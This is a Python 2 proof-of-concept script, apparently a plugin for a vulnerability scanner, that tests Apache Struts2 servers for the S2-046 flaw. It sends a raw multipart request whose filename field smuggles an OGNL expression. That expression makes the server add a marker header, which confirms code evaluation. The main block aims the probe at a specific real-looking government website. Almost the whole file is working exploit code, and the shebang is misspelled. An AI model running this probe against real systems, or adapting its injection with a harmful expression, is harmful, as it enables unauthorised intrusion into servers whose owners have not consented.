#!/usr/bin/evn python

import urlparse
import random
import socket


def assign(service, arg):
    if service == 'struts':
        return True, arg


def audit(arg):
    uri = urlparse.urlparse(arg).path
    http_host = urlparse.urlparse(arg).netloc
    port = 80
    if ':' in http_host:
        host = http_host.split(':')[0]
        port = int(http_host.split(':')[1])
    else:
        host = http_host
    randint1 = random.randint(1000, 10000)
    raw = """POST {uri} HTTP/1.1
Host: {host}
Content-Length: 270
Content-Type: multipart/form-data; boundary=1c88e9afa73c438d93b5043a7096b207
Connection: Keep-Alive
Referer: {referer}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6

--1c88e9afa73c438d93b5043a7096b207
Content-Disposition: form-data; name="Filename"; filename="%{{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test-{randint1}','Kaboom')}}'\x00b"
Content-Type: text/plain


--1c88e9afa73c438d93b5043a7096b207--
""".format(uri=uri, host=host, referer=arg, randint1=str(randint1)).replace('\n', '\r\n')

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(20)
    s.connect((host, port))
    s.send(raw)
    data = s.recv(1024)
    if 'X-Test-%s' % (randint1) in data:
        security_hole("%s" % arg, uuid='%s_s2_046' % (host))

if __name__ == '__main__':
    from dummy import *
    audit(assign('struts', "http://www.cf.nmgsme.gov.cn/website-rank/getVoteRecordByManuscriptId.action")[1])